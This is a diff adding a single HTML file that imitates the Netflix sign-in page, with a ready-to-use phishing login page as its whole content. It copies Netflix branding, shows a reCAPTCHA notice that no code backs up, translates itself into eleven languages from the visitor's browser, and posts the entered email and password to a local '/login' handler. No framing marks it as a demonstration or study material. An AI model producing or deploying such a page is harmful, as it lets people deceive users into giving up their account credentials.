@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Netflix</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;
+min-height:100vh;display:flex;align-items:center;justify-content:center}
+.bg{position:fixed;inset:0;background:linear-gradient(rgba(0,0,0,.7),rgba(0,0,0,.9));z-index:0}
+.wrap{position:relative;z-index:1;width:100%;max-width:450px}
+.header{padding:20px 0}
+.header .nf{color:#e50914;font-size:2rem;font-weight:700;letter-spacing:-1px}
+.card{background:rgba(0,0,0,.75);border-radius:4px;padding:60px 68px 40px}
+h1{color:#fff;font-size:2rem;font-weight:700;margin-bottom:28px}
+.input-wrap{position:relative;margin-bottom:16px}
+.input-wrap input{width:100%;padding:16px 20px 0;background:#333;border:none;
+border-radius:4px;color:#fff;font-size:16px;height:50px;outline:none}
+.input-wrap input:focus{background:#454545}
+.input-wrap label{position:absolute;top:14px;left:20px;color:#8c8c8c;
+font-size:14px;transition:all .2s;pointer-events:none}
+.input-wrap input:focus+label,.input-wrap input:not(:placeholder-shown)+label{
+top:4px;font-size:11px;color:#b3b3b3}
+.btn{width:100%;padding:16px;background:#e50914;color:#fff;border:none;
+border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;margin-top:24px}
+.btn:hover{background:#f40612}
+.remember{display:flex;align-items:center;justify-content:space-between;
+margin-top:12px;color:#b3b3b3;font-size:13px}
+.remember a{color:#b3b3b3;text-decoration:none}
+.remember a:hover{text-decoration:underline}
+.new{margin-top:16px;color:#737373;font-size:16px}
+.new a{color:#fff;text-decoration:none}
+.captcha{margin-top:12px;color:#737373;font-size:13px}
+@media(max-width:500px){.card{padding:40px 28px 28px}}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="wrap">
+<div class="header"><div class="nf">NETFLIX</div></div>
+<div class="card">
+<h1 data-i18n="title">Sign In</h1>
+<form method="POST" action="/login">
+<div class="input-wrap">
+<input type="text" name="username" id="email" placeholder=" " required autocomplete="off">
+<label for="email" data-i18n="email_label">Email or phone number</label>
+</div>
+<div class="input-wrap">
+<input type="password" name="password" id="pass" placeholder=" " required>
+<label for="pass" data-i18n="pass_label">Password</label>
+</div>
+<button type="submit" class="btn" data-i18n="signin">Sign In</button>
+</form>
+<div class="remember">
+<label><input type="checkbox" checked> <span data-i18n="remember">Remember me</span></label>
+<a href="#" data-i18n="help">Need help?</a>
+</div>
+<div class="new"><span data-i18n="new_q">New to Netflix?</span> <a href="#" data-i18n="signup">Sign up now.</a></div>
+<div class="captcha" data-i18n="captcha">This page is protected by Google reCAPTCHA.</div>
+</div>
+</div>
+<script>
+(function(){
+var T={
+en:{title:"Sign In",email_label:"Email or phone number",pass_label:"Password",signin:"Sign In",remember:"Remember me",help:"Need help?",new_q:"New to Netflix?",signup:"Sign up now.",captcha:"This page is protected by Google reCAPTCHA."},
+pt:{title:"Entrar",email_label:"Email ou n\u00famero de telefone",pass_label:"Senha",signin:"Entrar",remember:"Lembrar de mim",help:"Precisa de ajuda?",new_q:"Novo na Netflix?",signup:"Assine agora.",captcha:"Esta p\u00e1gina \u00e9 protegida pelo Google reCAPTCHA."},
+es:{title:"Iniciar sesi\u00f3n",email_label:"Email o n\u00famero de tel\u00e9fono",pass_label:"Contrase\u00f1a",signin:"Iniciar sesi\u00f3n",remember:"Recu\u00e9rdame",help:"\u00bfNecesitas ayuda?",new_q:"\u00bfNuevo en Netflix?",signup:"Suscr\u00edbete ahora.",captcha:"Esta p\u00e1gina est\u00e1 protegida por Google reCAPTCHA."},
+fr:{title:"Se connecter",email_label:"E-mail ou num\u00e9ro de t\u00e9l\u00e9phone",pass_label:"Mot de passe",signin:"Se connecter",remember:"Se souvenir de moi",help:"Besoin d'aide ?",new_q:"D\u00e9couvrez Netflix ?",signup:"Inscrivez-vous.",captcha:"Cette page est prot\u00e9g\u00e9e par Google reCAPTCHA."},
+de:{title:"Anmelden",email_label:"E-Mail oder Telefonnummer",pass_label:"Passwort",signin:"Anmelden",remember:"Angemeldet bleiben",help:"Brauchen Sie Hilfe?",new_q:"Neu bei Netflix?",signup:"Jetzt registrieren.",captcha:"Diese Seite wird durch Google reCAPTCHA gesch\u00fctzt."},
+it:{title:"Accedi",email_label:"Email o numero di telefono",pass_label:"Password",signin:"Accedi",remember:"Ricordami",help:"Hai bisogno di aiuto?",new_q:"Nuovo su Netflix?",signup:"Registrati adesso.",captcha:"Questa pagina \u00e8 protetta da Google reCAPTCHA."},
+ja:{title:"\u30ed\u30b0\u30a4\u30f3",email_label:"\u30e1\u30fc\u30eb\u30a2\u30c9\u30ec\u30b9\u307e\u305f\u306f\u96fb\u8a71\u756a\u53f7",pass_label:"\u30d1\u30b9\u30ef\u30fc\u30c9",signin:"\u30ed\u30b0\u30a4\u30f3",remember:"\u30ed\u30b0\u30a4\u30f3\u60c5\u5831\u3092\u4fdd\u5b58",help:"\u304a\u56f0\u308a\u3067\u3059\u304b\uff1f",new_q:"Netflix\u304c\u521d\u3081\u3066\u3067\u3059\u304b\uff1f",signup:"\u4eca\u3059\u3050\u767b\u9332",captcha:"Google reCAPTCHA\u3067\u4fdd\u8b77\u3055\u308c\u3066\u3044\u307e\u3059\u3002"},
+zh:{title:"\u767b\u5f55",email_label:"\u90ae\u7bb1\u6216\u624b\u673a\u53f7",pass_label:"\u5bc6\u7801",signin:"\u767b\u5f55",remember:"\u8bb0\u4f4f\u6211",help:"\u9700\u8981\u5e2e\u52a9\uff1f",new_q:"\u65b0\u7528\u6237\uff1f",signup:"\u7acb\u5373\u6ce8\u518c\u3002",captcha:"\u6b64\u9875\u9762\u53d7 Google reCAPTCHA \u4fdd\u62a4\u3002"},
+ko:{title:"\ub85c\uadf8\uc778",email_label:"\uc774\uba54\uc77c \ub610\ub294 \uc804\ud654\ubc88\ud638",pass_label:"\ube44\ubc00\ubc88\ud638",signin:"\ub85c\uadf8\uc778",remember:"\ub85c\uadf8\uc778 \uc815\ubcf4 \uc800\uc7a5",help:"\ub3c4\uc6c0\uc774 \ud544\uc694\ud558\uc2e0\uac00\uc694?",new_q:"Netflix\uac00 \ucc98\uc74c\uc774\uc2e0\uac00\uc694?",signup:"\uc9c0\uae08 \uac00\uc785\ud558\uc138\uc694.",captcha:"\uc774 \ud398\uc774\uc9c0\ub294 Google reCAPTCHA\ub85c \ubcf4\ud638\ub429\ub2c8\ub2e4."},
+ru:{title:"\u0412\u043e\u0439\u0442\u0438",email_label:"\u042d\u043b. \u043f\u043e\u0447\u0442\u0430 \u0438\u043b\u0438 \u0442\u0435\u043b\u0435\u0444\u043e\u043d",pass_label:"\u041f\u0430\u0440\u043e\u043b\u044c",signin:"\u0412\u043e\u0439\u0442\u0438",remember:"\u0417\u0430\u043f\u043e\u043c\u043d\u0438\u0442\u044c \u043c\u0435\u043d\u044f",help:"\u041d\u0443\u0436\u043d\u0430 \u043f\u043e\u043c\u043e\u0449\u044c?",new_q:"\u0412\u043f\u0435\u0440\u0432\u044b\u0435 \u043d\u0430 Netflix?",signup:"\u0417\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u0443\u0439\u0442\u0435\u0441\u044c.",captcha:"\u042d\u0442\u0430 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0430 \u0437\u0430\u0449\u0438\u0449\u0435\u043d\u0430 Google reCAPTCHA."},
+ar:{title:"\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644",email_label:"\u0627\u0644\u0628\u0631\u064a\u062f \u0627\u0644\u0625\u0644\u0643\u062a\u0631\u0648\u0646\u064a \u0623\u0648 \u0631\u0642\u0645 \u0627\u0644\u0647\u0627\u062a\u0641",pass_label:"\u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631",signin:"\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644",remember:"\u062a\u0630\u0643\u0631\u0646\u064a",help:"\u0647\u0644 \u062a\u062d\u062a\u0627\u062c \u0645\u0633\u0627\u0639\u062f\u0629\u061f",new_q:"\u062c\u062f\u064a\u062f \u0639\u0644\u0649 Netflix\u061f",signup:"\u0627\u0634\u062a\u0631\u0643 \u0627\u0644\u0622\u0646.",captcha:"\u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629 \u0645\u062d\u0645\u064a\u0629 \u0628\u0648\u0627\u0633\u0637\u0629 Google reCAPTCHA."}
+};
+var l=(navigator.language||navigator.userLanguage||'en').split('-')[0];var t=T[l]||T['en'];
+document.querySelectorAll('[data-i18n]').forEach(function(e){var k=e.getAttribute('data-i18n');if(t[k])e.textContent=t[k]});
+if(l==='ar'){document.documentElement.dir='rtl'}
+})();
+</script>
+</body>
+</html>
